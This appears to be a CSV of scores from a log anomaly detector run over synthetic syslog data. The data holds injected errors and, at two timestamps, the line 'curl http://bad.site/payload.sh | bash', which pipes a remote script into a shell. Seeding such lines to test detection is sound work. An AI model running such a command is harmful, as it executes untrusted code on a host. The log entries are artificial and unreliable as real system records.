bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 05:35:00,0.997980318656775,0,0,0.9999894441123176,3,62,named: Started Cleanup of Temporary Directories. || unix_chkpwd: Rotating log files. || ufw: Started CUPS Scheduler. || ntpd: Started CUPS Scheduler. || ufw: Listening on LVM2 poll daemon socket. || sudo: Started Session c120 of user root. || logrota
2026-07-01 05:36:00,0.9998873103573565,0,0,0.9999894441123176,3,60,NetworkManager: Rotating log files. || docker: Started Cleanup of Temporary Directories. || smartd: Accepted publickey for user from 10.0.0.29 port 22 ssh2. || ntpd: Listening on LVM2 poll daemon socket. || xinetd: Synced RTC time from system clock. 
2026-07-01 05:37:00,0.999743870608951,0,0,0.9999894441123176,3,59,ufw: Finished Daily apt download activities. || NetworkManager: Started Session c20 of user root. || docker: Started Cleanup of Temporary Directories. || ftpd: Accepted publickey for user from 10.0.0.144 port 22 ssh2. || CRON: Accepted publickey for 
2026-07-01 05:38:00,0.9994816492614959,0,0,0.9999894441123176,3,61,rsyslogd: kernel: Kernel panic - not syncing: Fatal exception || CRON: Started CUPS Scheduler. || cups: Started Cleanup of Temporary Directories. || ftpd: Started Session c9 of user root. || smartd: Started Cleanup of Temporary Directories. || rsyslo
2026-07-01 05:39:00,0.9995414242746333,0,0,0.9999894441123176,3,62,dockerd: Synced RTC time from system clock. || systemd-timesyncd: Started Cleanup of Temporary Directories. || docker: Finished Daily apt download activities. || logrotate: Accepted publickey for user from 10.0.0.248 port 22 ssh2. || systemd-timesync
2026-07-01 05:40:00,0.9995288863177162,0,0,0.9999894441123176,3,61,xinetd: Accepted publickey for user from 10.0.0.7 port 22 ssh2. || sshd: Finished Daily apt download activities. || unattended-upgrades: Synced RTC time from system clock. || dockerd: Started Cleanup of Temporary Directories. || docker: Rotating log 
2026-07-01 05:41:00,0.9993379578979074,0,0,0.9999894441123176,3,59,xinetd: Rotating log files. || named: Started Cleanup of Temporary Directories. || ftpd: Synced RTC time from system clock. || docker: Synced RTC time from system clock. || rsyslogd: Accepted publickey for user from 10.0.0.243 port 22 ssh2. || sudo: 
2026-07-01 05:42:00,0.9993902261449168,0,0,0.9999894441123176,3,59,smartd: Started CUPS Scheduler. || gpm: Rotating log files. || xinetd: Started CUPS Scheduler. || smartd: Started Session c72 of user root. || unix_chkpwd: Started CUPS Scheduler. || kernel: Started Session c251 of user root. || unattended-upgrades: 
2026-07-01 05:43:00,0.9998156378019725,0,0,0.9999894441123176,3,58,telnetd: Rotating log files. || systemd-timesyncd: Rotating log files. || telnetd: Finished Daily apt download activities. || dockerd: Listening on LVM2 poll daemon socket. || rsyslogd: Rotating log files. || rsyslogd: Started Cleanup of Temporary Di
2026-07-01 05:44:00,0.9999824499523251,0,0,0.9999894441123176,3,60,xinetd: Started Cleanup of Temporary Directories. || chronyd: Accepted publickey for user from 10.0.0.111 port 22 ssh2. || redis-server: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Failed password for invalid user test from 192.168.1.
2026-07-01 05:45:00,0.9999214507411425,0,0,0.9999894441123176,3,56,gpm: Started Cleanup of Temporary Directories. || docker: Accepted publickey for user from 10.0.0.194 port 22 ssh2. || redis-server: Finished Daily apt download activities. || systemd-timesyncd: Rotating log files. || named: Accepted publickey for us
2026-07-01 05:46:00,0.9997601129107047,0,0,0.9999894441123176,3,57,rsyslogd: Listening on LVM2 poll daemon socket. || ftpd: Accepted publickey for user from 10.0.0.235 port 22 ssh2. || dockerd: Started Cleanup of Temporary Directories. || systemd: Started Cleanup of Temporary Directories. || telnetd: Finished Daily 
2026-07-01 05:47:00,0.9981582636464029,0,0,0.9999894441123176,3,59,logrotate: Listening on LVM2 poll daemon socket. || ntpd: Rotating log files. || unix_chkpwd: Rotating log files. || smartd: Started Cleanup of Temporary Directories. || named: Accepted publickey for user from 10.0.0.237 port 22 ssh2. || ufw: Rotatin
2026-07-01 05:48:00,0.9986454350893883,0,0,0.9999894441123176,3,57,docker: Started Session c25 of user root. || ftpd: Finished Daily apt download activities. || unattended-upgrades: Accepted publickey for user from 10.0.0.60 port 22 ssh2. || chronyd: Listening on LVM2 poll daemon socket. || docker: Rotating log file
2026-07-01 05:49:00,0.9997395512364686,0,0,0.9999894441123176,3,57,named: Started CUPS Scheduler. || cups: Started Session c119 of user root. || NetworkManager: Started Cleanup of Temporary Directories. || ftpd: Started Cleanup of Temporary Directories. || ntpd: Started Cleanup of Temporary Directories. || CRON: Syn
2026-07-01 05:50:00,0.9992137981701252,0,0,0.9999894441123176,3,62,dockerd: Started Cleanup of Temporary Directories. || dockerd: Synced RTC time from system clock. || ftpd: Started CUPS Scheduler. || sudo: Rotating log files. || cups: Rotating log files. || NetworkManager: Started Cleanup of Temporary Directories. 
2026-07-01 05:51:00,0.980504656926809,0,0,0.9999894441123176,3,64,cups: Synced RTC time from system clock. || unattended-upgrades: Rotating log files. || NetworkManager: Started CUPS Scheduler. || smartd: Finished Daily apt download activities. || chronyd: Rotating log files. || ufw: Listening on LVM2 poll daemon s
2026-07-01 05:52:00,0.9989040526393881,0,0,0.9999894441123176,3,63,gpm: Finished Daily apt download activities. || xinetd: Listening on LVM2 poll daemon socket. || unattended-upgrades: Finished Daily apt download activities. || xinetd: Listening on LVM2 poll daemon socket. || docker: Started Session c30 of user root
2026-07-01 05:53:00,0.9997145720517197,0,0,0.9999894441123176,3,59,redis-server: Started Cleanup of Temporary Directories. || unix_chkpwd: Accepted publickey for user from 10.0.0.6 port 22 ssh2. || ntpd: Started CUPS Scheduler. || ntpd: Listening on LVM2 poll daemon socket. || CRON: Finished Daily apt download activ
2026-07-01 05:54:00,0.9895702446523734,0,0,0.9999894441123176,3,63,named: Rotating log files. || smartd: Rotating log files. || CRON: Rotating log files. || ntpd: Started CUPS Scheduler. || dockerd: Started Cleanup of Temporary Directories. || sshd: Synced RTC time from system clock. || chronyd: Listening on LVM2 po
2026-07-01 05:55:00,0.9925586783487745,0,0,0.9999894441123176,3,58,unattended-upgrades: Finished Daily apt download activities. || unattended-upgrades: Synced RTC time from system clock. || CRON: Finished Daily apt download activities. || logrotate: kernel: Kernel panic - not syncing: Fatal exception || ufw: Started
2026-07-01 05:56:00,0.9816307618954303,0,0,0.9999894441123176,3,59,ftpd: Finished Daily apt download activities. || logrotate: Started Cleanup of Temporary Directories. || xinetd: Finished Daily apt download activities. || CRON: Started CUPS Scheduler. || gpm: Started Cleanup of Temporary Directories. || cups: Start
2026-07-01 05:57:00,0.998197514934605,0,0,0.9999894441123176,3,59,docker: Listening on LVM2 poll daemon socket. || rsyslogd: Synced RTC time from system clock. || gpm: Finished Daily apt download activities. || rsyslogd: Started Cleanup of Temporary Directories. || telnetd: Listening on LVM2 poll daemon socket. || 
2026-07-01 05:58:00,0.9994697598717538,0,0,0.9999894441123176,3,60,redis-server: Synced RTC time from system clock. || CRON: Rotating log files. || ftpd: Synced RTC time from system clock. || kernel: Started Cleanup of Temporary Directories. || rsyslogd: Started CUPS Scheduler. || systemd-timesyncd: Started Session 
2026-07-01 05:59:00,0.9991773372300076,0,0,0.9999894441123176,3,59,kernel: Listening on LVM2 poll daemon socket. || smartd: Rotating log files. || NetworkManager: Started Session c82 of user root. || kernel: Listening on LVM2 poll daemon socket. || xinetd: Accepted publickey for user from 10.0.0.247 port 22 ssh2. ||
2026-07-01 06:00:00,0.9996425461274078,0,0,0.9999894441123176,3,57,dockerd: Rotating log files. || systemd-timesyncd: Synced RTC time from system clock. || systemd: Listening on LVM2 poll daemon socket. || rsyslogd: Rotating log files. || unix_chkpwd: Started Cleanup of Temporary Directories. || logrotate: Rotating 
2026-07-01 06:01:00,0.9999187431287152,0,0,0.9999894441123176,3,61,chronyd: kernel: Kernel panic - not syncing: Fatal exception || redis-server: Accepted publickey for user from 10.0.0.169 port 22 ssh2. || rsyslogd: Started Cleanup of Temporary Directories. || sshd: Started CUPS Scheduler. || dockerd: Finished Daily
2026-07-01 06:02:00,0.9993658128239225,0,0,0.9999894441123176,3,60,sudo: Started Cleanup of Temporary Directories. || ufw: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.60653 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || rsyslogd: Started CUPS Scheduler. || smartd: Started CUPS Scheduler. || chronyd: Started CUPS Sched
2026-07-01 06:03:00,0.9996072576063536,0,0,0.9999894441123176,3,58,telnetd: Finished Daily apt download activities. || rsyslogd: Started CUPS Scheduler. || named: Rotating log files. || telnetd: Listening on LVM2 poll daemon socket. || docker: Accepted publickey for user from 10.0.0.82 port 22 ssh2. || named: Starte
2026-07-01 06:04:00,0.9999680102124148,0,0,0.9999894441123176,3,59,CRON: Started Cleanup of Temporary Directories. || dockerd: Rotating log files. || xinetd: Listening on LVM2 poll daemon socket. || docker: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.49789 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || cups: Finished 
2026-07-01 06:05:00,0.9999432163186318,0,0,0.9999894441123176,3,57,unix_chkpwd: Started Session c49 of user root. || kernel: Synced RTC time from system clock. || NetworkManager: Rotating log files. || cups: kernel: Kernel panic - not syncing: Fatal exception || smartd: Rotating log files. || sshd: Started Cleanup o
2026-07-01 06:06:00,0.9999946280148778,1,0,0.9999894441123176,3,61,gpm: Listening on LVM2 poll daemon socket. || unattended-upgrades: Finished Daily apt download activities. || chronyd: Accepted publickey for user from 10.0.0.22 port 22 ssh2. || docker: Accepted publickey for user from 10.0.0.190 port 22 ssh2. || sy
2026-07-01 06:07:00,0.9998710846998816,0,0,0.9999894441123176,3,58,kernel: Accepted publickey for user from 10.0.0.225 port 22 ssh2. || cups: Finished Daily apt download activities. || gpm: Synced RTC time from system clock. || ntpd: Started Session c208 of user root. || chronyd: Finished Daily apt download activiti
2026-07-01 06:08:00,0.9998110936202784,0,0,0.9999894441123176,3,54,redis-server: Accepted publickey for user from 10.0.0.167 port 22 ssh2. || chronyd: Finished Daily apt download activities. || sudo: Started CUPS Scheduler. || systemd-timesyncd: Rotating log files. || unix_chkpwd: Rotating log files. || NetworkManag
2026-07-01 06:09:00,0.9993314120901716,0,0,0.9999894441123176,3,59,kernel: Listening on LVM2 poll daemon socket. || ufw: Finished Daily apt download activities. || redis-server: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || logrotate: Synced RTC time from system clock. || 
2026-07-01 06:10:00,0.9989926530187662,0,0,0.9999894441123176,3,59,ntpd: Started CUPS Scheduler. || systemd: Started Cleanup of Temporary Directories. || kernel: Finished Daily apt download activities. || dockerd: Accepted publickey for user from 10.0.0.40 port 22 ssh2. || NetworkManager: Started Session c143 of use
2026-07-01 06:11:00,0.9996134299419854,0,0,0.9999894441123176,3,64,chronyd: Rotating log files. || docker: Accepted publickey for user from 10.0.0.243 port 22 ssh2. || chronyd: Started CUPS Scheduler. || ftpd: Started CUPS Scheduler. || dockerd: Started Cleanup of Temporary Directories. || systemd-timesyncd: Accepte
2026-07-01 06:12:00,0.9987717195728472,0,0,0.9999894441123176,3,61,ufw: Synced RTC time from system clock. || dockerd: Synced RTC time from system clock. || docker: Started Cleanup of Temporary Directories. || systemd: Started Cleanup of Temporary Directories. || cups: Finished Daily apt download activities. || CRON
2026-07-01 06:13:00,0.9918447884879276,0,0,0.9999894441123176,3,63,dockerd: Started Session c112 of user root. || ftpd: Rotating log files. || cups: bash: -c: line 1: curl http://bad.site/payload.sh | bash || rsyslogd: Rotating log files. || docker: Rotating log files. || telnetd: Rotating log files. || unattended-u
2026-07-01 06:14:00,0.9984604501134932,0,0,0.9999894441123176,3,59,NetworkManager: Synced RTC time from system clock. || gpm: Accepted publickey for user from 10.0.0.163 port 22 ssh2. || ufw: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || unattended-upgrades: kern
2026-07-01 06:15:00,0.9997299589097112,0,0,0.9999894441123176,3,61,ntpd: Started CUPS Scheduler. || ftpd: Rotating log files. || ntpd: Started Session c244 of user root. || sshd: Started CUPS Scheduler. || docker: Started Cleanup of Temporary Directories. || chronyd: app[1234]: segfault at 0 ip 00007f stackpointer e
2026-07-01 06:16:00,0.9994124662980338,0,0,0.9999894441123176,3,61,NetworkManager: Listening on LVM2 poll daemon socket. || CRON: Rotating log files. || ftpd: Synced RTC time from system clock. || redis-server: Listening on LVM2 poll daemon socket. || dockerd: Rotating log files. || docker: Started Cleanup of Tempor
2026-07-01 06:17:00,0.9999047128761607,0,0,0.9999894441123176,3,61,sshd: Rotating log files. || ntpd: Synced RTC time from system clock. || systemd-timesyncd: Synced RTC time from system clock. || chronyd: Finished Daily apt download activities. || kernel: Accepted publickey for user from 10.0.0.57 port 22 ssh2. || 
2026-07-01 06:18:00,0.9998389255467572,0,0,0.9999894441123176,3,60,named: Started CUPS Scheduler. || telnetd: Finished Daily apt download activities. || kernel: Rotating log files. || smartd: Accepted publickey for user from 10.0.0.126 port 22 ssh2. || cups: Listening on LVM2 poll daemon socket. || chronyd: Started 
2026-07-01 06:19:00,0.9994333388128378,0,0,0.9999894441123176,3,58,unix_chkpwd: Listening on LVM2 poll daemon socket. || dockerd: Started Session c140 of user root. || unattended-upgrades: Synced RTC time from system clock. || docker: Started Session c167 of user root. || ntpd: Started CUPS Scheduler. || cups: Rotat
2026-07-01 06:20:00,0.9990304681869417,0,0,0.9999894441123176,3,62,rsyslogd: Synced RTC time from system clock. || logrotate: Synced RTC time from system clock. || sshd: Started CUPS Scheduler. || unattended-upgrades: Failed password for invalid user test from 192.168.1.27636 port 22 ssh2 || NetworkManager: Finished
2026-07-01 06:21:00,0.9982042240703892,0,0,0.9999894441123176,3,63,ntpd: Started Session c73 of user root. || dockerd: Listening on LVM2 poll daemon socket. || ufw: Synced RTC time from system clock. || gpm: Started CUPS Scheduler. || rsyslogd: Accepted publickey for user from 10.0.0.161 port 22 ssh2. || sudo: Start
2026-07-01 06:22:00,0.9996155503943294,0,0,0.9999894441123176,3,56,telnetd: Synced RTC time from system clock. || xinetd: Accepted publickey for user from 10.0.0.81 port 22 ssh2. || NetworkManager: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || docker: Finished Daily apt do
2026-07-01 06:23:00,0.9979765598550046,0,0,0.9999894441123176,3,59,chronyd: Started Cleanup of Temporary Directories. || sshd: Started CUPS Scheduler. || kernel: Started CUPS Scheduler. || logrotate: Synced RTC time from system clock. || redis-server: Started CUPS Scheduler. || unattended-upgrades: Started CUPS Sche
2026-07-01 06:24:00,0.9995453934077796,0,0,0.9999894441123176,3,60,sshd: Started Session c65 of user root. || dockerd: Started Session c228 of user root. || NetworkManager: Listening on LVM2 poll daemon socket. || ftpd: Started CUPS Scheduler. || unattended-upgrades: Started Session c26 of user root. || unattended-u
2026-07-01 06:25:00,0.9989629597423128,0,0,0.9999894441123176,3,58,kernel: Listening on LVM2 poll daemon socket. || cups: Started CUPS Scheduler. || systemd-timesyncd: Synced RTC time from system clock. || named: Started Session c144 of user root. || cups: Started Cleanup of Temporary Directories. || docker: Started
2026-07-01 06:26:00,0.9996906449514917,0,0,0.9999894441123176,3,60,NetworkManager: Synced RTC time from system clock. || chronyd: Rotating log files. || ufw: Accepted publickey for user from 10.0.0.235 port 22 ssh2. || rsyslogd: Started CUPS Scheduler. || dockerd: Synced RTC time from system clock. || docker: bash: 
2026-07-01 06:27:00,0.9997821846669936,0,0,0.9999894441123176,3,58,unattended-upgrades: Started CUPS Scheduler. || systemd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || systemd-timesyncd: kernel: Out of memory: Kill process 62540 (python3) score 987 or sacrifice child || 
2026-07-01 06:28:00,0.9971488800660433,0,0,0.9999894441123176,3,63,ufw: Started Session c42 of user root. || ftpd: Started Session c36 of user root. || cups: kernel: Kernel panic - not syncing: Fatal exception || CRON: Started Cleanup of Temporary Directories. || unix_chkpwd: Listening on LVM2 poll daemon socket. ||
2026-07-01 06:29:00,0.9954872930923135,0,0,0.9999894441123176,3,57,dockerd: Listening on LVM2 poll daemon socket. || systemd: Rotating log files. || NetworkManager: kernel: Kernel panic - not syncing: Fatal exception || rsyslogd: Started CUPS Scheduler. || smartd: Started Session c210 of user root. || redis-server: 
2026-07-01 06:30:00,0.9996303407928961,0,0,0.9999894441123176,3,56,named: Synced RTC time from system clock. || sudo: Started Cleanup of Temporary Directories. || docker: Started Cleanup of Temporary Directories. || xinetd: Listening on LVM2 poll daemon socket. || logrotate: Started CUPS Scheduler. || sshd: Listenin
2026-07-01 06:31:00,0.9961774918338228,0,0,0.9999894441123176,3,58,redis-server: Started Session c97 of user root. || logrotate: Rotating log files. || dockerd: Accepted publickey for user from 10.0.0.194 port 22 ssh2. || dockerd: Rotating log files. || dockerd: Synced RTC time from system clock. || CRON: kernel: Ou
2026-07-01 06:32:00,0.9988221918283454,0,0,0.9999894441123176,3,59,chronyd: Started Cleanup of Temporary Directories. || xinetd: Accepted publickey for user from 10.0.0.240 port 22 ssh2. || ntpd: Accepted publickey for user from 10.0.0.253 port 22 ssh2. || docker: Started Session c30 of user root. || systemd: Listen
2026-07-01 06:33:00,0.999392094101194,0,0,0.9999894441123176,3,59,gpm: Started Cleanup of Temporary Directories. || cups: Started CUPS Scheduler. || CRON: Listening on LVM2 poll daemon socket. || kernel: Started Cleanup of Temporary Directories. || ntpd: Finished Daily apt download activities. || named: Rotating lo
2026-07-01 06:34:00,0.9981917729116546,0,0,0.9999894441123176,3,58,redis-server: kernel: Out of memory: Kill process 3624 (python3) score 987 or sacrifice child || rsyslogd: Rotating log files. || named: Synced RTC time from system clock. || rsyslogd: Listening on LVM2 poll daemon socket. || ftpd: Finished Daily apt
2026-07-01 06:35:00,0.9983244544457524,0,0,0.9999894441123176,3,61,rsyslogd: Accepted publickey for user from 10.0.0.77 port 22 ssh2. || telnetd: Rotating log files. || smartd: Started Session c74 of user root. || rsyslogd: Started Cleanup of Temporary Directories. || unix_chkpwd: Accepted publickey for user from 10
2026-07-01 06:36:00,0.9999040901427343,0,0,0.9999894441123176,3,56,systemd: Accepted publickey for user from 10.0.0.211 port 22 ssh2. || xinetd: Started Session c73 of user root. || logrotate: Listening on LVM2 poll daemon socket. || logrotate: Started Session c193 of user root. || rsyslogd: kernel: Kernel panic - n
2026-07-01 06:37:00,0.9563567267337519,0,0,0.9999894441123176,3,59,named: Started Session c32 of user root. || ntpd: Started CUPS Scheduler. || cups: Started Session c243 of user root. || smartd: Started Cleanup of Temporary Directories. || ufw: Accepted publickey for user from 10.0.0.201 port 22 ssh2. || logrotate:
2026-07-01 06:38:00,0.9740330297717172,0,0,0.9999894441123176,3,59,cups: Started CUPS Scheduler. || telnetd: Started CUPS Scheduler. || xinetd: Rotating log files. || kernel: Finished Daily apt download activities. || kernel: Rotating log files. || systemd-timesyncd: Started Cleanup of Temporary Directories. || syst
2026-07-01 06:39:00,0.9992349864836082,0,0,0.9999894441123176,3,58,docker: Listening on LVM2 poll daemon socket. || cups: Finished Daily apt download activities. || telnetd: Listening on LVM2 poll daemon socket. || sudo: Finished Daily apt download activities. || telnetd: Started CUPS Scheduler. || cups: Synced RTC 
2026-07-01 06:40:00,0.9983673446833371,0,0,0.9999894441123176,3,60,systemd: Started Cleanup of Temporary Directories. || ftpd: Started CUPS Scheduler. || systemd: Started Cleanup of Temporary Directories. || docker: Accepted publickey for user from 10.0.0.161 port 22 ssh2. || NetworkManager: Started CUPS Scheduler. 
2026-07-01 06:41:00,0.9905167914547044,0,0,0.9999894441123176,3,65,telnetd: Synced RTC time from system clock. || rsyslogd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Started Cleanup of Temporary Directories. || dockerd: Listening on LVM2 poll daemon socket. || NetworkManager: Listening on LVM2 poll
2026-07-01 06:42:00,0.9996995338701327,0,0,0.9999894441123176,3,57,ftpd: Started CUPS Scheduler. || cups: Rotating log files. || rsyslogd: Listening on LVM2 poll daemon socket. || chronyd: Started CUPS Scheduler. || ftpd: Started Cleanup of Temporary Directories. || ufw: Started Session c69 of user root. || xinetd: 
2026-07-01 06:43:00,0.9999327110768963,0,0,0.9999894441123176,3,61,gpm: Started Cleanup of Temporary Directories. || ufw: Accepted publickey for user from 10.0.0.208 port 22 ssh2. || ntpd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || gpm: Accepted publickey for user from 
2026-07-01 06:44:00,0.9995563868245801,0,0,0.9999894441123176,3,61,sshd: Listening on LVM2 poll daemon socket. || ftpd: Rotating log files. || unix_chkpwd: Started Session c211 of user root. || cups: Accepted publickey for user from 10.0.0.26 port 22 ssh2. || dockerd: Rotating log files. || ftpd: Listening on LVM2 p
2026-07-01 06:45:00,0.9998357902558762,0,0,0.9999894441123176,3,59,unattended-upgrades: Started Cleanup of Temporary Directories. || telnetd: Listening on LVM2 poll daemon socket. || gpm: Started CUPS Scheduler. || systemd-timesyncd: Finished Daily apt download activities. || redis-server: Synced RTC time from syste
2026-07-01 06:46:00,0.9998267961048422,0,0,0.9999894441123176,3,62,redis-server: Synced RTC time from system clock. || named: Rotating log files. || unix_chkpwd: Started Session c164 of user root. || xinetd: Finished Daily apt download activities. || ftpd: kernel: Out of memory: Kill process 30814 (python3) score 98
2026-07-01 06:47:00,0.9999783816632686,0,0,0.9999894441123176,3,57,docker: Started Cleanup of Temporary Directories. || gpm: Finished Daily apt download activities. || docker: Started Cleanup of Temporary Directories. || ftpd: Finished Daily apt download activities. || gpm: Started CUPS Scheduler. || docker: Finishe
2026-07-01 06:48:00,0.999893525616652,0,0,0.9999894441123176,3,56,sudo: Accepted publickey for user from 10.0.0.238 port 22 ssh2. || ntpd: Started Cleanup of Temporary Directories. || chronyd: Finished Daily apt download activities. || ftpd: Accepted publickey for user from 10.0.0.10 port 22 ssh2. || xinetd: Starte
2026-07-01 06:49:00,0.9997965329275561,0,0,0.9999894441123176,3,56,xinetd: Synced RTC time from system clock. || logrotate: Started Session c37 of user root. || sudo: Started Session c188 of user root. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || gpm: Started CUPS Scheduler. || sshd: Finished Daily
2026-07-01 06:50:00,0.9943631312205714,0,0,0.9999894441123176,3,58,CRON: Finished Daily apt download activities. || ntpd: Accepted publickey for user from 10.0.0.138 port 22 ssh2. || ftpd: Rotating log files. || kernel: Synced RTC time from system clock. || kernel: Finished Daily apt download activities. || smartd: 
2026-07-01 06:51:00,0.9965545207258782,0,0,0.9999894441123176,3,59,gpm: Started Cleanup of Temporary Directories. || named: Listening on LVM2 poll daemon socket. || telnetd: Started Cleanup of Temporary Directories. || kernel: Accepted publickey for user from 10.0.0.145 port 22 ssh2. || logrotate: Listening on LVM2 
2026-07-01 06:52:00,0.9989552106627042,0,0,0.9999894441123176,3,60,chronyd: Rotating log files. || redis-server: Finished Daily apt download activities. || gpm: Accepted publickey for user from 10.0.0.120 port 22 ssh2. || dockerd: Started Session c214 of user root. || ntpd: Rotating log files. || unix_chkpwd: Accept
2026-07-01 06:53:00,0.9997300367718875,0,0,0.9999894441123176,3,59,docker: Rotating log files. || redis-server: Rotating log files. || smartd: Finished Daily apt download activities. || CRON: Listening on LVM2 poll daemon socket. || telnetd: Listening on LVM2 poll daemon socket. || NetworkManager: Synced RTC time fr
2026-07-01 06:54:00,0.9999423021415476,0,0,0.9999894441123176,3,62,systemd: Started Session c219 of user root. || dockerd: Accepted publickey for user from 10.0.0.31 port 22 ssh2. || logrotate: Finished Daily apt download activities. || ntpd: Started Session c67 of user root. || sudo: Started Cleanup of Temporary Di
2026-07-01 06:55:00,0.9999084302657129,0,0,0.9999894441123176,3,61,smartd: Started Cleanup of Temporary Directories. || docker: Started Session c13 of user root. || systemd-timesyncd: Accepted publickey for user from 10.0.0.198 port 22 ssh2. || unattended-upgrades: Started Cleanup of Temporary Directories. || chrony
2026-07-01 06:56:00,0.9996578728406226,0,0,0.9999894441123176,3,58,docker: Started Cleanup of Temporary Directories. || gpm: Accepted publickey for user from 10.0.0.103 port 22 ssh2. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || rsyslogd: Started Session c218 of user root. || logrotate: [UFW BLOCK] 
2026-07-01 06:57:00,0.9971607833306377,0,0,0.9999894441123176,3,63,ntpd: Finished Daily apt download activities. || ufw: Finished Daily apt download activities. || dockerd: Started Cleanup of Temporary Directories. || ufw: Started Session c145 of user root. || logrotate: Listening on LVM2 poll daemon socket. || xine
2026-07-01 06:58:00,0.9939902277737771,0,0,0.9999894441123176,3,60,gpm: Accepted publickey for user from 10.0.0.44 port 22 ssh2. || sudo: Started CUPS Scheduler. || sudo: Accepted publickey for user from 10.0.0.87 port 22 ssh2. || logrotate: Rotating log files. || ufw: Listening on LVM2 poll daemon socket. || Networ
2026-07-01 06:59:00,0.9994948523048346,0,0,0.9999894441123176,3,62,kernel: Started CUPS Scheduler. || systemd: Started Cleanup of Temporary Directories. || unix_chkpwd: Listening on LVM2 poll daemon socket. || kernel: Synced RTC time from system clock. || cups: Rotating log files. || sshd: Rotating log files. || ufw
2026-07-01 07:00:00,0.9985235582803034,0,0,0.9999894441123176,3,57,rsyslogd: Accepted publickey for user from 10.0.0.70 port 22 ssh2. || unattended-upgrades: Synced RTC time from system clock. || redis-server: Listening on LVM2 poll daemon socket. || chronyd: Started CUPS Scheduler. || CRON: Finished Daily apt downl
2026-07-01 07:01:00,0.9998412215525386,0,0,0.9999894441123176,3,61,ftpd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || sshd: Synced RTC time from system clock. || telnetd: Started Cleanup of Temporary Directories. || sudo: Finished Daily apt download activities. 
2026-07-01 07:02:00,0.9988316491136782,0,0,0.9999894441123176,3,58,sudo: Finished Daily apt download activities. || ntpd: Synced RTC time from system clock. || telnetd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || NetworkManager: Started CUPS Scheduler. || chronyd: Starte
2026-07-01 07:03:00,0.9985050141531034,0,0,0.9999894441123176,3,60,ufw: Listening on LVM2 poll daemon socket. || rsyslogd: Started CUPS Scheduler. || CRON: Listening on LVM2 poll daemon socket. || gpm: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || dockerd: kernel
2026-07-01 07:04:00,0.9909654689085317,0,0,0.9999894441123176,3,58,cups: Synced RTC time from system clock. || sshd: Finished Daily apt download activities. || sshd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || logrotate: Finished Daily apt download activities. || sshd: Listening on LVM2 poll daemon s
2026-07-01 07:05:00,0.9996082661390816,0,0,0.9999894441123176,3,65,ufw: Finished Daily apt download activities. || NetworkManager: Started Cleanup of Temporary Directories. || unattended-upgrades: Started Session c234 of user root. || docker: Rotating log files. || ntpd: Started CUPS Scheduler. || rsyslogd: Accepted
2026-07-01 07:06:00,0.9977735994599902,0,0,0.9999894441123176,3,60,ufw: Started Cleanup of Temporary Directories. || logrotate: Listening on LVM2 poll daemon socket. || telnetd: Synced RTC time from system clock. || logrotate: Started Cleanup of Temporary Directories. || chronyd: Started Cleanup of Temporary Directo
2026-07-01 07:07:00,0.9989645374131653,0,0,0.9999894441123176,3,60,unattended-upgrades: Started Cleanup of Temporary Directories. || docker: Listening on LVM2 poll daemon socket. || logrotate: Synced RTC time from system clock. || smartd: Accepted publickey for user from 10.0.0.215 port 22 ssh2. || sudo: Started Ses
